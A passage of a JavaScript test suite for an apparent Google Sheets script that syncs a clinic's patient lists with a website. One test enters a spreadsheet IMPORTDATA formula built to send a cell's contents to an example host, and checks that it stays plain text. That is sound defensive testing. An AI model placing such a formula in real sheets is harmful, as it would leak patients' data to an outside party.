  const reads = () => env.stats.calls.read || 0;
  const r0 = reads(), f0 = env.stats.fetches;
  env.ticks(3);
  assert.equal(env.stats.fetches - f0, 3, 'one question per minute');
  assert.equal(reads(), r0, 'no sheet range was read in a quiet minute');
  const last = server.calls[server.calls.length - 1].payload;
  assert.equal(last.tabs[0].rows.length, 0);
  assert.ok(!('present' in last.tabs[0]), 'no list of present rows: the website claims and removes nothing');
  assert.equal(last.check_removed, false);
  setCell(env, GUL, 2, 'treatment details', 'typed in the sheet');
  env.tickAfter(5000);
  assert.ok(reads() > r0, 'a person typed: the tabs are read in full');
  assert.equal(webVisit(server, 'Sample Person One').details, 'typed in the sheet');
  env.tickAfter(61000);
  env.ticks(1);
  const r1 = reads();
  env.ticks(2);
  assert.equal(reads(), r1, 'quiet again');
});

test('the tabs are read in full at least every five minutes even when nobody typed (a sort or a paste may not tell Google\'s triggers)', () => {
  const { env, server } = synced();
  env.ticks(1);
  env.props.document.set('fullAt', String(env.clock.ms));             // the tabs were just read in full
  const reads = () => env.stats.calls.read || 0;
  const r0 = reads();
  env.ticks(2);
  assert.equal(reads(), r0);
  const sh = env.tab(GUL);
  sh._set(2, colOf(env, GUL, 'treatment details'), { kind: 's', v: 'changed behind the trigger\'s back' });          // no on-edit, no on-change
  env.ticks(2);
  assert.equal(webVisit(server, 'Sample Person One').details, 'U L 018 Pc', 'not noticed within two minutes');
  env.advance(5 * 60000);
  env.ticks(1);
  assert.equal(webVisit(server, 'Sample Person One').details, 'changed behind the trigger\'s back', 'noticed at the next full read');
});

test('a website change is noticed by the quiet question and the tabs are then read in full', () => {
  const { env, server } = synced();
  env.ticks(2);
  const reads = () => env.stats.calls.read || 0;
  const r0 = reads();
  server.editVisit(webVisit(server, 'Sample Person Two').id, { details: 'website news' });
  env.ticks(1);
  assert.ok(reads() > r0);
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Sample Person Two'), 'treatment details'), 'website news');
});

test('a new row that is still settling keeps the following minutes in full until it has been sent; a failed call does too', () => {
  const { env, server } = synced({ extra: [{ mr: '9801', name: 'Settle Sam', phone: '03001110801' }] });
  env.typeRow(GUL, 8, ['9801', 'Settle Sam', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.tickAfter(20000);
  env.tickAfter(30000);
  assert.equal(rowsSent(server).filter((x) => x.set.name === 'Settle Sam').length, 0, 'still settling');
  env.tickAfter(30000);
  assert.equal(rowsSent(server).filter((x) => x.set.name === 'Settle Sam').length, 1, 'sent as soon as it was quiet for 60 s, not five minutes later');
  server.faults.down = 1;
  setCell(env, GUL, 2, 'treatment details', 'while the website is down');
  env.tickAfter(5000);
  env.tickAfter(60000);
  assert.equal(webVisit(server, 'Sample Person One').details, 'while the website is down', 'the next minute tried again at once');
});

test('the run time of the edit runs counts too: "rte:" grows with every edit and the stop at 65 minutes counts both', () => {
  const { env } = synced();
  env.ticks(1);
  setCell(env, GUL, 2, 'treatment details', 'x');
  assert.ok(Number(env.props.document.get('rte:' + TODAY)) >= 0 && env.props.document.has('rte:' + TODAY), 'the edit run was counted');
  env.props.document.set('rte:' + TODAY, String(4000000));
  const f = env.stats.fetches;
  env.at(TODAY, '08:21');
  env.tick();
  assert.equal(env.stats.fetches, f, 'edits alone used up the day: the ticks stop');
  assert.equal(headerOf(env, GUL), 'Website \u00b7 paused for today (Google time limit). Use the website.');
  env.at(NEXT, '08:00');
  env.props.document.set('listDate:' + GUL, NEXT);
  env.ticks(1);
  assert.ok(!env.props.document.has('rte:' + TODAY), 'yesterday\'s counter is gone');
});

test('a website that answers BUSY three minutes in a row is shown in the headings; one busy minute is not', () => {
  const { env, server } = synced();
  const before = headerOf(env, GUL);
  server.faults.busy = true;
  env.tickAfter(60000);
  assert.equal(headerOf(env, GUL), before, 'one busy minute: nothing shown');
  env.tickAfter(60000);
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \u2717 \d\d:\d\d the website is busy, trying again$/);
  server.faults.busy = false;
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d( \u00b7 \d+ need attention|\s\u2713)$/);
});

test('R3: the website\'s limit of 20 calls a minute (RATE_LIMIT) is a wait, like BUSY: shown as "busy, trying again" after three minutes, never as "did not answer"; then it carries on', () => {
  const { env, server } = synced();
  const rows = rowsSent(server).length;
  server.faults.rateLimit = 1000;
  env.tickAfter(60000);
  env.tickAfter(60000);
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \u2717 \d\d:\d\d the website is busy, trying again$/);
  assert.ok(!/did not answer/.test(headerOf(env, GUL)));
  server.faults.rateLimit = 0;
  env.tickAfter(60000);
  assert.match(headerOf(env, GUL), /^Website \u00b7 \d\d:\d\d( \u00b7 \d+ need attention|\s\u2713)$/);
  assert.equal(rowsSent(server).length, rows, 'nothing was sent twice');
});

// ------------------------------------------------------------------------------------------------ the archive: the script was off, a Google hiccup, formulas
test('the script was off all night and a row was typed this morning: the old rows go to the archive under their day, the new row stays and goes to the website as today\'s', () => {
  const { env, server } = synced({ extra: [{ mr: '9801', name: 'Morning Mary', phone: '03001110801' }] });
  env.at(TODAY, '17:00');
  env.ticks(1);
  env.at(NEXT, '08:03');                                      // the trigger was dead since 17:00
  env.typeRow(GUL, 8, ['9801', 'Morning Mary', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.advance(61000);
  env.ticks(1);
  const arch = archiveSheet(env);
  assert.equal(arch.used().rows, 7, 'the six old rows and the header');
  assert.ok(!arch.values().some((r) => r.includes('Morning Mary')), 'the morning row is not archived under yesterday\'s date');
  assert.equal(rowOf(env, GUL, 'Morning Mary'), 8, 'it stays on the tab');
  assert.equal(dataCells(env).length, 1);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /1 rows typed today stay on the tab as today's patients/);
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitsOf('GUL', NEXT).length, 1, 'and it reached the website as a row of today');
  assert.equal(server.visitsOf('GUL', NEXT)[0].mr, '9801');
  assert.equal(server.visitsOf('GUL', TODAY).length, 6);
});

test('a Google hiccup while opening the archive starts no second archive: nothing is cleared and the next minute tries again; after five failed minutes a new one is made', () => {
  const { env } = dayEnd();
  env.at(NEXT, '00:05');
  env.ticks(1);
  const id = env.props.document.get('archiveId');
  assert.equal(env.archiveBooks().length, 1);
  env.at(NEXT, '09:00');
  env.typeRow(GUL, 2, ['', 'Day Two', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.at('2026-10-11', '00:05');
  env.openErrors[id] = 'Exception: Service error: Spreadsheets';
  for (let i = 1; i <= 4; i++) {
    env.ticks(1);
    assert.equal(env.archiveBooks().length, 1, 'still the one archive after failure ' + i);
    assert.equal(env.props.document.get('archiveId'), id);
    assert.equal(rowOf(env, GUL, 'Day Two'), 2, 'nothing cleared');
  }
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /could not be opened right now .*Trying again next minute/);
  delete env.openErrors[id];
  env.ticks(1);
  assert.equal(env.archiveBooks().length, 1);
  assert.equal(archiveSheet(env).text(archiveSheet(env).used().rows, 3), 'Day Two', 'filed in the same archive when Google answered again');
  // five failures in a row: a new archive
  env.typeRow(GUL, 2, ['', 'Day Three', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110802', '']);
  env.at('2026-10-12', '00:05');
  env.openErrors[id] = 'Exception: Service error: Spreadsheets';
  for (let i = 0; i < 5; i++) env.ticks(1);
  assert.equal(env.archiveBooks().length, 2, 'after five failed minutes a new archive is made');
  assert.notEqual(env.props.document.get('archiveId'), id);
});

test('text that staff typed in the Website column, or in a header, is written back as text and never becomes a formula', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const wc = colOf(env, GUL, 'website');
  env.type(GUL, 3, wc, "'=IMPORTDATA(\"https://example.com/?\"&B2)");           // typed with a leading apostrophe: it shows as =IMPORTDATA(...)
  server.editVisit(webVisit(server, 'Sample Person One').id, { status: 'cancelled' });
  env.ticks(1);                                                                // another row's status changed: the whole column is written again
  assert.equal(cellOf(env, GUL, 2, 'waiting'), 'Cancelled');
  assert.equal(env.stats.formulaWrites, 0, 'nothing was written as a formula');
  assert.equal(sh.kind(3, wc), 's');
  assert.equal(sh.text(3, wc), '=IMPORTDATA("https://example.com/?"&B2)');
  // a header that looks like a formula, at the nightly copy
  sh._set(1, colOf(env, GUL, 'reminder'), { kind: 's', v: '=1+1' });
  env.at(NEXT, '00:05');
  env.ticks(1);
  assert.equal(env.stats.formulaWrites, 0);
  const arch = archiveSheet(env);
  assert.ok(arch.row(1).includes('=1+1'), 'the header is archived as text');
});

test('a row that the website says was taken off and then put back to work comes back to the sheet (the "removed" mark with a working status)', () => {
  const { env, server } = world({ patients: BASE_PATIENTS, rows: { [GUL]: [] } });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9701', status: 'waiting' });
  const w = server.addVisit({ branch: 'GUL', date: TODAY, mr: '146', status: 'cancelled' });
  const orig = env.fetchHandler;
  env.fetchHandler = (req) => {
    const r = orig(req);
    const body = JSON.parse(r.body);
    for (const t of body.tabs || []) for (const x of t.visits || []) if (x.id === v.id || x.id === w.id) x.removed = true;
    return { code: r.code, body: JSON.stringify(body) };
  };
  env.ticks(3);
  assert.ok(rowOf(env, GUL, 'Sample Person One'), 'removed mark but Waiting: the row returns');
  assert.equal(rowOf(env, GUL, 'Sample Person Two'), null, 'removed mark and Cancelled: it stays off the sheet');
});

// ------------------------------------------------------------------------------------------------ the nightly list of checkup patients ("Checkup karwaliya")
function ckDay(extra = {}) {
  const w = ckWorld(extra);
  w.env.at(TODAY, '23:58');
  w.env.ticks(1);
  w.env.at(NEXT, '00:05');
  w.env.ticks(1);
  return w;
}

test('at night the day\'s checkup patients (rows with no Mr#) are added to the checkup sheet: date, name, phone, city, clinic, doctor, treatment, status, source tab; patients with an Mr# are not', () => {
  const { env } = ckDay({ patients: BASE_PATIENTS });
  const ck = ckSheet(env);
  assert.ok(ck, 'the tab "Aj ki List checkups" was made');
  assert.deepEqual(ck.row(1), ['Month', 'Patient Name', 'Phone', 'City', 'Clinic', 'Doctor', 'Treatment / Checkup For', 'Est. Fee (Rs)', 'Status', 'Notes', 'Source Tab', 'Sync id']);
  assert.ok(ck.hidden.has(12), 'the id column is hidden');
  assert.equal(ck.used().rows, 3, 'two checkups and the header; none of the patients with an Mr#');
  assert.match(ck.text(2, 1), /^2026-10-09T/, 'the checkup\'s day');
  assert.deepEqual(ck.row(2).slice(1, 11), ['Check One', '03001110301', 'Karachi', 'RJ Mall', 'Dr Haniya', 'Checkup', '', 'Not Contacted', 'scaling advised', 'Aj ki List - Gulshan KHI']);
  assert.equal(ck.kind(2, 3), 's', 'a phone is text: the leading 0 survives');
  assert.deepEqual(ck.row(3).slice(1, 8), ['Check Two', '', 'Karachi', 'RJ Mall', '', 'Consultation checkup', '']);
  assert.match(ck.text(2, 12), /^2026-10-09\|S-[0-9a-f]{12}$/);
  assert.equal(env.props.document.get('ckNote'), undefined);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /2 checkup patients added to "Aj ki List checkups" in the checkup list\./);
});

test('every checkup patient is added once: the same lines again add nothing; nothing in the checkup sheet is edited or deleted', () => {
  const w = ckDay({ patients: BASE_PATIENTS });
  const { env } = w;
  const ck = ckSheet(env);
  const before = JSON.stringify(ck.values());
  const lines = [
    { id: '2026-10-09|' + env.tab('Aaj Sync log').text(1, 1), date: TODAY, name: 'Not Real', phone: '', city: 'Karachi', clinic: 'RJ Mall', doctor: '', treatment: '', notes: '', source: 'x' },
  ];
  const first = env.call('aajCkWrite_', lines);
  assert.equal(first.added, 1);
  const again = env.call('aajCkWrite_', lines);
  assert.equal(again.added, 0, 'the same id is not added twice');
  const sheetLines = JSON.stringify(ck.values().slice(0, 3));
  assert.equal(sheetLines, JSON.stringify(JSON.parse(before).slice(0, 3)), 'earlier rows untouched');
  // the lines the nightly run builds are the same on a second look at the same archived rows
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: env.call('aajDetectColumns', fixture.headers[GUL]) };
  const rows = [{ key: 'S-0123456789ab', cells: ['', 'Dup Check', '', 'Checkup', '', '', '', '', '', '', '', '0300 1234567', ''] }];
  assert.deepEqual(env.call('aajCheckupLines', s, rows, TODAY), env.call('aajCheckupLines', s, rows, TODAY));
  assert.equal(env.call('aajCheckupLines', s, rows, TODAY)[0].phone, '03001234567');
  assert.equal(env.call('aajCheckupLines', s, rows, TODAY)[0].id, TODAY + '|S-0123456789ab');
  assert.equal(env.call('aajCheckupLines', s, [{ key: '', cells: ['9701', 'Has Mr', '', '', '', '', '', '', '', '', '', '', ''] }], TODAY).length, 0, 'a row with an Mr# is no checkup');
  assert.equal(env.call('aajCheckupLines', s, [{ key: '', cells: ['NEW', 'Typed New', '', 'Checkup', '', '', '', '', '', '', '', '', ''] }], TODAY).length, 1, 'NEW counts as no Mr#');
});

test('a checkup tab that already exists (the owner\'s own columns, rows, order): rows are appended at the bottom, columns found by header text, only one new header cell (Sync id) is written next to the data', () => {
  const w = world({ rows: { [GUL]: CHECKUP_ROWS }, patients: BASE_PATIENTS, checkupBook: false });
  const header = ['Notes', 'Month', 'Patient Name', 'Phone', 'Clinic', 'Status', 'Treatment / Checkup For'];
  w.env.checkupBook = w.env.addBook(CK_ID, 'Checkup karwaliya', { 'July 26': [header, ['old note', 'Jul 2026', 'Old Patient', '0300 000 0000', 'RJ Mall', 'Interested', 'Checkup'], ['', 'Jul 2026', 'Old Two', '', 'Lahore Gulberg', 'Not Contacted', '']] });
  w.env.props.script.set('CHECKUP_TAB', 'July 26');
  settle(w.env, 3);
  w.env.at(TODAY, '23:58'); w.env.ticks(1);
  w.env.at(NEXT, '00:05'); w.env.ticks(1);
  const sh = w.env.checkupBook.getSheetByName('July 26');
  assert.deepEqual(sh.row(2).slice(0, 7), ['old note', 'Jul 2026', 'Old Patient', '0300 000 0000', 'RJ Mall', 'Interested', 'Checkup'], 'old rows exactly as they were');
  assert.deepEqual(sh.row(3).slice(0, 7), ['', 'Jul 2026', 'Old Two', '', 'Lahore Gulberg', 'Not Contacted', ''], 'and the second one');
  assert.equal(sh.used().rows, 5);
  assert.equal(sh.text(1, 8), 'Sync id', 'one header cell next to the last header');
  assert.deepEqual([sh.text(4, 3), sh.text(4, 4), sh.text(4, 5), sh.text(4, 6), sh.text(4, 7), sh.text(4, 1)], ['Check One', '03001110301', 'RJ Mall', 'Not Contacted', 'Checkup', 'scaling advised']);
  assert.equal(w.env.checkupBook.getSheetByName('Aj ki List checkups'), null, 'no other tab was made');
});

test('no edit access to the checkup sheet: the sync and the archive go on, the nightly list says so clearly and keeps the patients to add later; when access comes they are added', () => {
  const w = ckWorld({ patients: BASE_PATIENTS });
  const { env, server } = w;
  env.openErrors[CK_ID] = 'You do not have permission to access the requested document.';
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT, 'the archive and the new day went ahead');
  assert.equal(archiveSheet(env).used().rows, 3, 'the day is in the archive');
  assert.match(env.props.document.get('ckNote'), /^Checkup list not updated: the "Checkup karwaliya" sheet could not be opened \(You do not have permission to access the requested document\.\)\. Dr\. Ali's Google account needs edit access to it\.$/);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /Checkup list not updated: .* 2 checkup patients are kept here and added as soon as it works\./);
  assert.ok(env.props.document.get('ckq:0'), 'the two patients wait');
  // Aaj Sync > Status says so
  env.responder = () => 'OK';
  env.ctx.aajStatus();
  const text = env.dialogs[env.dialogs.length - 1].text;
  assert.match(text, /Checkup list not updated/);
  assert.match(text, /2 checkup patients wait to be added/);
  // the sync keeps working for the new day
  env.at(NEXT, '08:00');
  server.addPatient({ mr: '9801', name: 'Morning Mary', phone: '03001110801' });
  env.typeRow(GUL, 2, ['9801', 'Morning Mary', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110801', '']);
  env.tickAfter(61000);
  env.ticks(2);
  assert.equal(server.visitsOf('GUL', NEXT).length, 1);
  // access comes: the next try (at most every 30 minutes) adds them, once
  delete env.openErrors[CK_ID];
  env.tickAfter(31 * 60000);
  const ck = ckSheet(env);
  assert.equal(ck.used().rows, 3);
  assert.equal(env.props.document.get('ckNote'), undefined);
  assert.equal(env.props.document.get('ckq:0'), undefined);
  env.tickAfter(31 * 60000);
  assert.equal(ckSheet(env).used().rows, 3, 'not added again');
});

test('no edit access for long: no more than 300 checkup patients are kept to add later (the oldest are dropped, the log says how many)', () => {
  const { env } = ckWorld({ patients: BASE_PATIENTS });
  env.openErrors[CK_ID] = 'You do not have permission to access the requested document.';
  const st = env.ctx.aajLoadState_();
  const ctx = env.ctx.aajNewCtx_(st, false);
  const lines = [];
  for (let i = 0; i < 320; i++) lines.push({ id: TODAY + '|k' + i, date: TODAY, name: 'Waiting ' + i, phone: '', city: '', clinic: '', doctor: '', treatment: '', notes: '', source: 'x' });
  env.ctx.aajAppendCheckups_(ctx, lines);
  const kept = JSON.parse(JSON.stringify(env.ctx.aajCkLoad_(st)));
  assert.equal(kept.length, 300);
  assert.equal(kept[0].name, 'Waiting 20', 'the 20 oldest were dropped');
  assert.equal(kept[299].name, 'Waiting 319');
  env.ctx.aajFlushLog_(ctx);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r[3]).join('\n'), /20 of the oldest checkup patients cannot be kept for later\./);
});

test('Set up tells at the end when the checkup sheet cannot be opened (everything else still works); with access it says nothing about it', () => {
  const a = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false, checkupBook: false });
  scripted(a.env);
  a.env.ctx.aajSetup();
  const lastA = a.env.dialogs[a.env.dialogs.length - 1].text;
  assert.match(lastA, /Checkup list not updated: the "Checkup karwaliya" sheet could not be opened/);
  assert.match(lastA, /The sync itself works; only the nightly list of checkup patients is off until this is fixed\./);
  assert.equal(ours(a.env).length, 4, 'and the sync is installed');
  const b = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(b.env);
  b.env.ctx.aajSetup();
  assert.ok(!/Checkup list/.test(b.env.dialogs[b.env.dialogs.length - 1].text));
  assert.equal(b.env.props.document.get('ckNote'), undefined);
});

test('the checkup sheet and its tab can be changed in Script Properties (CHECKUP_SHEET_ID, CHECKUP_TAB)', () => {
  const w = world({ rows: { [GUL]: CHECKUP_ROWS }, patients: BASE_PATIENTS, checkupBook: false });
  const other = w.env.addBook('other-book-id', 'Another sheet');
  w.env.props.script.set('CHECKUP_SHEET_ID', 'other-book-id');
  w.env.props.script.set('CHECKUP_TAB', 'My checkups');
  settle(w.env, 3);
  w.env.at(TODAY, '23:58'); w.env.ticks(1);
  w.env.at(NEXT, '00:05'); w.env.ticks(1);
  assert.equal(other.getSheetByName('My checkups').used().rows, 3);
});

test('the secret and the sync power: nothing in the script reads a secret from Script Properties, and the file says what the secret can do', () => {
  const src = fs.readFileSync(SCRIPT_PATH, 'utf8');
  assert.ok(!/getScriptProperties\(\)\.getProperty\('AAJ_SYNC_SECRET'\)/.test(src));
  assert.ok(/WHAT THE SECRET CAN DO/.test(src));
  assert.ok(!/MailApp|GmailApp|DriveApp/.test(src), 'no mail and no Drive: the script asks for nothing it does not use');
  const urls = [...src.matchAll(/UrlFetchApp\.fetch\(([^,]*),/g)].map((m) => m[1].trim());
  assert.deepEqual(urls, ["AAJ.URL + '/rest/v1/rpc/aaj_sync'"], 'the only place the script talks to is the website\'s one door');
});

test('Aaj Sync > Status shows the last good sync, the run time used today and each tab\'s day', () => {
  const { env } = synced();
  env.ticks(2);
  env.responder = () => 'OK';
  env.ctx.aajStatus();
  const text = env.dialogs[env.dialogs.length - 1].text;
  assert.match(text, /^Last good sync: 09 Oct \d\d:\d\d\n/);
  assert.match(text, /Google run time used today: \d+ minutes of about 90/);
  assert.match(text, /Gulshan KHI: list of 2026-10-09/);
  assert.match(text, /North Nazimabad: list of not set up/);
  assert.match(text, /Checkup list: nothing added yet\./);
});

// ------------------------------------------------------------------------------------------------ review round 3 (9 Oct 2026)
test('K1 (owner, 13:20): a row with no Mr# whose Treatment is not a checkup is an existing patient whose Mr# was forgotten: "Needs attention: add the Mr#", no checkup, no patient, never in the nightly checkup list; typing the Mr# repairs the row', () => {
  const rows = [
    ['', 'Faizan Ikram', '', 'Filling & Crown prep', '', 'Waiting', '', '', '', '', '', '03001110401', ''],
    ['', 'Walk Checkup', '', 'Checkup / pain', '', 'Waiting', '', '', '', '', '', '03001110402', ''],
    ['', 'No Treatment Yet', '', '', '', 'Waiting', '', '', '', '', '', '03001110403', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [...BASE_PATIENTS, { mr: '9810', name: 'Faizan Ikram', phone: '03001110401' }] });
  settle(env, 3);
  assert.deepEqual(server.state.checkups.map((c) => c.name), ['Walk Checkup'], 'only the row that says Checkup is a checkup');
  assert.equal(server.state.visits.length, 0);
  assert.equal(server.state.patients.length, 4, 'and no patient file was made for anybody');
  const NEED = '✗ Needs attention: add the Mr#. A row with no Mr# is a checkup only when its Treatment says checkup. Look the Mr# up in Healthwire.';
  assert.equal(statusOf(env, GUL, 2), NEED);
  assert.equal(statusOf(env, GUL, 4), NEED, 'a row with no Treatment at all is not a checkup either');
  assert.equal(env.tab(GUL).font(2, colOf(env, GUL, 'website')), '#b91c1c', 'red');
  assert.equal(statusOf(env, GUL, 3), '✓ Checkup patient: no Mr#, no patient file.');
  assert.match(headerOf(env, GUL), /2 need attention/);
  quiet(env, server);                                      // not sent again every minute
  // the nightly list takes the checkup, not the rows that need an Mr#
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  const ck = ckSheet(env);
  assert.equal(ck.used().rows, 2, 'header and the one checkup');
  assert.equal(ck.text(2, 2), 'Walk Checkup');
  // a person looks the Mr# up in Healthwire and types it: the row is the patient's visit
  const w = world({ rows: { [GUL]: rows }, patients: [...BASE_PATIENTS, { mr: '9810', name: 'Faizan Ikram', phone: '03001110401' }] });
  settle(w.env, 3);
  setCell(w.env, GUL, 2, 'mr', '9810');
  w.env.advance(61000);
  w.env.ticks(2);
  assert.equal(w.server.state.visits.length, 1);
  assert.equal(statusOf(w.env, GUL, 2), '✓ On website');
  assert.match(headerOf(w.env, GUL), /1 need attention/, 'one row still needs its Mr#');
});

test('K2: a row that is cut and pasted somewhere else (or whose name is cleared and typed again) is never read as a deleted row: the visit is adopted by the moved row, not removed and made again', () => {
  const { env, server } = synced();
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const v = webVisit(server, 'Sample Person Three');
  const before = server.state.visits.length;
  const r = rowOf(env, GUL, 'Sample Person Three');
  // cut the visible cells of the row and paste them at row 10: the hidden key / base / edit cells stay where they were
  const cells = []; for (let c = 1; c < kc; c++) cells.push(sh._get(r, c));
  for (let c = 1; c < kc; c++) sh._set(r, c, null);
  cells.forEach((cell, i) => { if (cell) sh._set(10, i + 1, cell); });
  env.ctx.aajOnEdit({ range: sh.getRange(10, 1, 1, kc - 1), source: env.book });
  env.touch();
  env.ticks(1);
  assert.equal(server.visitById(v.id), v, 'the visit was not deleted while the moved row settles');
  assert.equal(server.state.removedLog.length, 0, 'no removal was asked for');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.length, before, 'no visit lost, none doubled');
  assert.equal(server.visitById(v.id), v, 'the same visit (same id, same history)');
  assert.equal(v.sheet_key, sh.text(10, colOf(env, GUL, 'sync key')), 'it now belongs to the row it was moved to');
  assert.equal(server.state.removedLog.length, 0);
  assert.ok(!env.tab('Aaj Sync log').values().some((row) => /removed from the website/.test(row.join(' '))), 'nothing was reported as removed');
  assert.equal(statusOf(env, GUL, 10), '✓ On website');
  for (let rr = 2; rr <= 10; rr++) assert.ok(!/Already on this list/.test(statusOf(env, GUL, rr)), `row ${rr} says: ${statusOf(env, GUL, rr)}`);
  quiet(env, server);
  // the name cell is cleared (Delete key) and typed again a moment later
  const r1 = rowOf(env, GUL, 'Sample Person Five');
  const v1 = webVisit(server, 'Sample Person Five');
  assert.equal(v1.status, 'waiting', 'a visit the website would take off the list if its row were deleted');
  setCell(env, GUL, r1, 'patients name', '');
  env.ticks(1);
  assert.equal(server.visitById(v1.id), v1, 'a cleared name cell is not a deleted row');
  setCell(env, GUL, r1, 'patients name', 'Sample Person Five');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.visitById(v1.id), v1, 'and retyped, it is the same visit');
  assert.equal(server.state.removedLog.length, 0);
  assert.equal(server.state.visits.length, before);
});

test('K5: Set up with an empty answer ("today") on a tab whose rows are already Completed asks once more; "No" asks for the day again; a typed day, or a tab with nothing Completed, is not asked', () => {
  const sure = [];
  const w = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(w.env, { days: { [GUL]: ['', '08-10-2026'] }, sure: (d) => { sure.push(d); return 'NO'; } });
  w.env.ctx.aajSetup();
  assert.equal(sure.length, 1, 'asked once');
  assert.equal(sure[0].title, GUL);
  assert.equal(sure[0].text, '2 of these 6 patients are marked Completed. A list with Completed patients is usually a day that has finished, and TODAY would make every one of them a visit of today on the website.\n\nAre these really today\'s patients?');
  assert.equal(w.env.dialogs.filter((d) => /Which day/.test(d.text)).length, 2, '"No" asks for the day again');
  assert.equal(archiveSheet(w.env).text(2, 1), '2026-10-08', 'the second answer (an earlier day) archived the rows under that day');
  assert.equal(w.server.state.visits.length, 0, 'no visit was made for today');
  // yes: today
  const y = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(y.env, { days: { [GUL]: [''] }, sure: 'YES' });
  y.env.ctx.aajSetup();
  assert.equal(y.env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(dataCells(y.env).length, 6);
  // today typed as a date: a deliberate answer, no question
  const d = world({ tabs: [GUL], patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(d.env, { days: { [GUL]: ['09-10-2026'] }, sure: () => { throw new Error('must not be asked'); } });
  d.env.ctx.aajSetup();
  assert.equal(d.env.props.document.get('listDate:' + GUL), TODAY);
  // a morning list with nothing Completed: no question
  const rows = [['9701', 'Sample Person One', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110001', ''], ['', 'Walk In', '', 'Checkup', '', '', '', '', '', '', '', '03001110099', '']];
  const m = world({ tabs: [GUL], rows: { [GUL]: rows }, patients: ALL_PATIENTS, install: false, helpers: false });
  scripted(m.env, { sure: () => { throw new Error('must not be asked'); } });
  m.env.ctx.aajSetup();
  assert.equal(m.env.props.document.get('listDate:' + GUL), TODAY);
});

test('K6: a Mr# typed with a stray dot or space ("9701.") is the number 9701 in the script and in the Admin -> Import reader: it is sent, not flagged', () => {
  const env0 = createEnv();
  for (const [text, mr] of [['9701.', '9701'], [' 9701. ', '9701'], ['9701..', '9701'], ['146.0', '146'], ['9701', '9701']]) {
    assert.deepEqual(env0.call('aajMrOf', text), { mr, isNew: false }, text);
    assert.deepEqual(web.mrOf(text), { mr, isNew: false }, 'web ' + text);
  }
  assert.deepEqual(env0.call('aajMrOf', '.'), { mr: null, isNew: false });
  assert.equal(env0.call('aajFieldKey', 'mr', '9701.'), '9701', 'the cell text compared between ticks ignores the dot too');
  const rows = [['9701.', 'Sample Person One', '', 'Monthly', '', 'Waiting', '', '', '', '', '', '03001110001', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.equal(rowsSent(server)[0].set.mr, '9701', 'the Mr# is sent without the dot');
  assert.equal(server.state.visits.length, 1);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '9701.', 'and the typed cell is left alone');
  quiet(env, server);
});

test('K8: the nightly checkup list follows the row\'s own checkup flag: a checkup that became a patient the same day (its Mr# was written into the row) is still listed; Cancelled and No show are not; a row the website never saw counts only when its Treatment says checkup', () => {
  const env0 = createEnv();
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: env0.call('aajDetectColumns', fixture.headers[GUL]) };
  const row = (mr, name, treatment, status, extra = {}) => ({ key: '', fp: '', cells: [mr, name, '', treatment, '', status, '', '', '', '', '', '03001110500', ''], visit: '', checkup: false, ...extra });
  const lines = (rows) => env0.call('aajCheckupLines', s, rows, TODAY).map((l) => l.name);
  assert.deepEqual(lines([
    row('50001', 'Registered Checkup', 'Checkup', 'Completed', { checkup: true, visit: 'v1', ckMr: '50001' }),
    row('50002', 'Registered Cancelled', 'Checkup', 'Cancelled', { checkup: true, visit: 'v2', ckMr: '50002' }),
    row('', 'Did Not Come', 'Checkup', 'No show', { checkup: true, visit: 'v3' }),
    row('9702', 'Mr Typed Into Checkup', 'Checkup', 'Waiting', { checkup: true, visit: 'v6' }),      // RW8-1: still a checkup on the website (a refused Mr#; a matching one would have made the row a visit, no checkup memory)
    row('9701', 'A Patient', 'Checkup', 'Completed', { visit: 'v4' }),
    row('', 'Needs Mr', 'Filling', 'Waiting', { visit: 'v5' }),
    row('', 'Never Seen Filling', 'Filling', 'Waiting'),
    row('', 'Never Seen Checkup', 'Xray checkup', 'Waiting'),
    row('NEW', 'Never Seen New', 'chek up', ''),
  ]), ['Registered Checkup', 'Mr Typed Into Checkup', 'Never Seen Checkup', 'Never Seen New']);
  // end to end: Check One is registered as a patient during the day, Check Two is cancelled on the website
  const w = ckWorld({ patients: BASE_PATIENTS });
  const c1 = w.server.state.checkups.find((x) => x.name === 'Check One'), c2 = w.server.state.checkups.find((x) => x.name === 'Check Two');
